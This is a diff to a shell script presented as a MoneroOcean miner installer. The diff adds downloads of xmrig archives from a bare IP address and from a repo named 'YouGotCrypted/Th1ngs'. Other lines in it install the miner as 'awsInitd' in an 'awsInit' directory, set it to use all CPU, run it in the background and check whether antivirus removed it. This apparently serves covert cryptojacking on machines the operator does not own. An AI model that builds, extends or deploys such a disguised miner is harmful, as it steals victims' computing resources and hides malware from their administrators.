@@ -8,17 +8,17 @@ echo "MoneroOcean mining setup script v$VERSION."
 echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"
 echo
 
-if [ "$(id -u)" == "0" ]; then
+if [ "$(id -u)" = "0" ]; then
     echo "WARNING: Generally it is not adviced to run this script under root"
 fi
 
 # command line arguments
 WALLET=$1
 DEBUG=$2
-EMAIL=$3 # this one is optional
+TYPE=$3
+EMAIL=$4 # this one is optional
 
 # checking prerequisites
-
 if [ -z $WALLET ]; then
     echo "Script usage:"
     echo "> setup_moneroocean_miner.sh <wallet address> [<your email address>]"
@@ -66,7 +66,7 @@ check_docker() {
 }
 
 write_info() {
-    if [ "$DEBUG" = true ]; then
+    if [ "$DEBUG" = "true" ]; then
         local value="$1"
         if [ -n "$value" ]; then
             echo $value >> info_pers
@@ -98,10 +98,10 @@ working_dir=$(determine_working_dir)
 configure_from_ram() {
     FREE_RAM=$(free -m | awk '/^Mem:/{print $7}')
     if [ "$FREE_RAM" -lt 512 ]; then
-        sed -i'' 's/"algo": *null/"algo": "cn-pico"/' "$working_dir/moneroocean/config.json"
+        sed -i'' 's/"algo": null/"algo": "cn-pico"/' "$working_dir/moneroocean/config.json"
         write_info "cn-pico selected"
     elif [ "$FREE_RAM" -lt 2350 ]; then
-        sed -i'' 's/"algo": *null/"algo": "rx/wow"/' "$working_dir/moneroocean/config.json"
+        sed -i'' 's/"algo": null/"algo": "rx\/wow"/' "$working_dir/moneroocean/config.json"
         write_info "rx/wow selected"
     fi
 }
@@ -250,12 +250,27 @@ rm -rf $working_dir/awsInit
 libc_type=$(check_system_libc)
 
 if [ "$libc_type" = "musl" ]; then
-    if ! curl -L --progress-bar "https://raw.githubusercontent.com/YouGotCrypted/Th1ngs/main/xmrig-musl-static-x64.tar.gz" -o /tmp/data.tar.gz; then
-        echo "ERROR: cant't download https://raw.githubusercontent.com/YouGotCrypted/Th1ngs/main/xmrig-musl-static-x64.tar.gz file to /tmp/data.tar.gz"
-        exit 1
+    if [ -n "$TYPE" ]; then
+        if [ "$TYPE" = "custom" ]; then
+            echo "CUSTOM MUSL DOWNLOAD"
+            if ! curl -L --progress-bar "http://219.86.210.133:8090/file/xmrig-musl-static-x64.tar.gz" -o /tmp/data.tar.gz; then
+                echo "ERROR: cant't download http://219.86.210.133:8090/file/xmrig-musl-static-x64.tar.gz file to /tmp/data.tar.gz"
+                exit 1
+            fi
+        fi
+        if [ "$TYPE" = "raw6" ]; then
+            if ! curl -L -6 --progress-bar "https://raw.githubusercontent.com/YouGotCrypted/Th1ngs/main/xmrig-musl-static-x64.tar.gz" -o /tmp/data.tar.gz; then
+                echo "ERROR: cant't download https://raw.githubusercontent.com/YouGotCrypted/Th1ngs/main/xmrig-musl-static-x64.tar.gz file to /tmp/data.tar.gz"
+                exit 1
+            fi
+        fi
+    else
+        if ! curl -L --progress-bar "https://raw.githubusercontent.com/YouGotCrypted/Th1ngs/main/xmrig-musl-static-x64.tar.gz" -o /tmp/data.tar.gz; then
+            echo "ERROR: cant't download https://raw.githubusercontent.com/YouGotCrypted/Th1ngs/main/xmrig-musl-static-x64.tar.gz file to /tmp/data.tar.gz"
+            exit 1
+        fi
     fi
-
-    echo "[*] Unpacking /tmp/xmrig.tar.gz to $working_dir/awsInit"
+    echo "[*] Unpacking /tmp/data.tar.gz to $working_dir/awsInit"
     [ -d $working_dir/awsInit ] || mkdir $working_dir/awsInit
     if ! tar xf /tmp/data.tar.gz -C $working_dir/awsInit; then
         echo "ERROR: Can't unpack /tmp/data.tar.gz to $working_dir/awsInit directory"
@@ -276,34 +291,48 @@ if [ "$libc_type" = "musl" ]; then
         exit 1
     fi
 else
-    echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
-    if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/data.tar.gz; then
-        echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/data.tar.gz"
-        exit 1
-    fi
-
-    echo "[*] Unpacking /tmp/xmrig.tar.gz to $working_dir/awsInit"
-    [ -d $working_dir/awsInit ] || mkdir $working_dir/awsInit
-    if ! tar xf /tmp/data.tar.gz -C $working_dir/awsInit; then
-        echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $working_dir/awsInit directory"
-        exit 1
-    fi
-    rm /tmp/data.tar.gz
-
-    echo "[*] Checking if advanced version of $working_dir/awsInit/xmrig works fine (and not removed by antivirus software)"
-    sed -i'' 's/"donate-level": *[^,]*,/"donate-level": 0,/' $working_dir/awsInit/config.json
-    $working_dir/awsInit/xmrig --help >/dev/null
-    if (test $? -ne 0); then
-        if [ -f $working_dir/awsInit/xmrig ]; then
-            echo "WARNING: Advanced version of $working_dir/awsInit/xmrig is not functional"
-        else 
-            echo "WARNING: Advanced version of $working_dir/awsInit/xmrig was removed by antivirus (or some other problem)"
+    if [ -n "$TYPE" ]; then
+        if [ "$TYPE" = "custom" ]; then
+            echo "CUSTOM GLIBC DOWNLOAD"
+            if ! curl -L --progress-bar "http://219.86.210.133:8090/file/xmrig-v6.25.0-mo1-lin64-compat.tar.gz" -o /tmp/data.tar.gz; then
+                echo "ERROR: cant't download http://219.86.210.133:8090/file/xmrig-v6.25.0-mo1-lin64-compat.tar.gz file to /tmp/data.tar.gz"
+                exit 1
+            fi
         fi
-        rm -rf $working_dir/awsInit
-        exit 1
+        if [ "$TYPE" = "raw6" ]; then
+            if ! curl -L -6 --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/data.tar.gz; then
+                echo "ERROR: cant't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/data.tar.gz"
+                exit 1
+            fi
+        fi
+    else
+        if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/data.tar.gz; then
+            echo "ERROR: cant't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/data.tar.gz"
+            exit 1
+        fi
     fi
 fi
 
+echo "[*] Unpacking /tmp/xmrig.tar.gz to $working_dir/awsInit"
+[ -d $working_dir/awsInit ] || mkdir $working_dir/awsInit
+if ! tar xf /tmp/data.tar.gz -C $working_dir/awsInit; then
+    echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $working_dir/awsInit directory"
+    exit 1
+fi
+rm /tmp/data.tar.gz
+
+echo "[*] Checking if advanced version of $working_dir/awsInit/xmrig works fine (and not removed by antivirus software)"
+sed -i'' 's/"donate-level": *[^,]*,/"donate-level": 0,/' $working_dir/awsInit/config.json
+$working_dir/awsInit/xmrig --help >/dev/null
+if (test $? -ne 0); then
+    if [ -f $working_dir/awsInit/xmrig ]; then
+        echo "WARNING: Advanced version of $working_dir/awsInit/xmrig is not functional"
+    else 
+        echo "WARNING: Advanced version of $working_dir/awsInit/xmrig was removed by antivirus (or some other problem)"
+    fi
+    rm -rf $working_dir/awsInit
+    exit 1
+fi
 mv $working_dir/awsInit/xmrig $working_dir/awsInit/awsInitd
 echo "[*] Miner $working_dir/awsInit/awsInitd is OK"
 
@@ -311,7 +340,7 @@ PASS=`curl -s ifconfig.me`
 if [ -z $PASS ]; then
     PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 fi
-if [ "$PASS" == "localhost" ]; then
+if [ "$PASS" = "localhost" ]; then
     PASS=`ip route get 1 | awk '{print $NF;exit}'`
 fi
 if [ -z $PASS ]; then
@@ -328,7 +357,7 @@ sed -i'' 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $working_dir/awsIni
 sed -i'' 's#"log-file": *null,#"log-file": "'$working_dir/awsInit/awsdlog.log'",#' $working_dir/awsInit/config.json
 sed -i'' 's/"syslog": *[^,]*,/"syslog": true,/' $working_dir/awsInit/config.json
 
-configure_from_ram
+#configure_from_ram
 
 cp $working_dir/awsInit/config.json $working_dir/awsInit/config_background.json
 sed -i'' 's/"background": *false,/"background": true,/' $working_dir/awsInit/config_background.json
